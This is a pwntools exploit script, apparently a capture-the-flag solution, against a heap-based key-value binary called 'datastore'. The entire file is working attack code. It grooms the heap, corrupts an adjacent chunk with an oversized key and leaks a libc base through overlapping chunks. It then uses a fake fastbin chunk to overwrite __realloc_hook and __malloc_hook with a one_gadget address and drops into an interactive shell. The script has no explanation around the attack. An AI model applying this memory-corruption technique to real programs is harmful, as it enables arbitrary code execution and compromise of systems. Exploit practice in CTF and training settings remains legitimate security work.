from pwn import *

context.update(arch="amd64", os="linux", log_level="debug")
context.terminal = ["qterminal", "-e"]
p = process("./datastore")
elf = ELF("./datastore")
libc = elf.libc


def debug():
    gdb.attach(p)


def PUT(key, size, data):
    p.recvuntil("command")
    p.sendline("PUT")
    p.recvuntil("key")
    sleep(0.1)
    p.sendline(key)
    p.recvuntil("size")
    sleep(0.1)
    p.sendline(str(size))
    p.recvuntil("data")
    p.sendline(data)


def GET(key):
    p.recvuntil("command")
    p.sendline("GET")
    p.recvuntil("key")
    sleep(0.1)
    p.sendline(key)


def DEL(key):
    p.recvuntil("command")
    p.sendline("DEL")
    p.recvuntil("key")
    p.sendline(key)


for i in range(0, 10):
    PUT(str(i), 0x38, b"a" * 0x37)
for i in range(0, 10):
    DEL(str(i))

PUT("A", 0x71, b"a" * 0x70)
PUT("B", 0x101, b"a" * 0x101)  # target
PUT("C", 0x81, b"a" * 0x80)
PUT("DEFENSE", "0x81", b"a" * 0x80)
# debug()
DEL("A")
DEL("B")
# debug()
PUT(0x78 * "A", 0x38, b"b" * 0x37)  # A->B
# debug()
PUT("B1", 0x81, b"a" * 0x80)
# debug()
PUT("B2", 0x41, b"a" * 0x40)
# debug()
DEL("B1")
DEL("C")
PUT("B1", 0x81, b"a" * 0x80)  # 0x90
# debug()
GET("B2")
libcbase = (
    u64(p.recvuntil(b"\x7f")[-6:].ljust(8, b"\x00")) - 0x7FFFF7BC3B78 + 0x7FFFF7800000
)
log.info("libcbase:%x" % (libcbase))
DEL("B1")
# fast bin
fake_chunk = p64(0) * 16 + p64(0) + p64(0x71) + p64(0) * 12 + p64(0) + p64(0x21)
PUT("B1", 0x191, fake_chunk.ljust(0x190, b"a"))
DEL("B2")
DEL("B1")
# hook
malloc_hook = libcbase + libc.symbols["__malloc_hook"]
realloc_hook = libcbase + libc.symbols["__realloc_hook"]
realloc=libcbase+libc.symbols["realloc"]
payload = p64(0) * 16 + p64(0) + p64(0x71) + p64(realloc_hook - 0x1b)
PUT("B1", 0x191, payload.ljust(0x190, b"a"))
log.info('readdr=%x'%(realloc_hook))
log.info('maaddr=%x'%(malloc_hook))
#debug()

PUT("D", 0x61, b"A" * 0x60)#B1
# pwn
onegadget = p8(0)*0xb+p64(libcbase + 0x4525a)
onegadget+=p64(realloc)

PUT("getshll", 0x61,onegadget.ljust(0x60,b'a'))#realloc_hook+malloc_hook

#gdb.attach(p,'b malloc')
sleep(0.1)
p.sendline('GET')
p.interactive()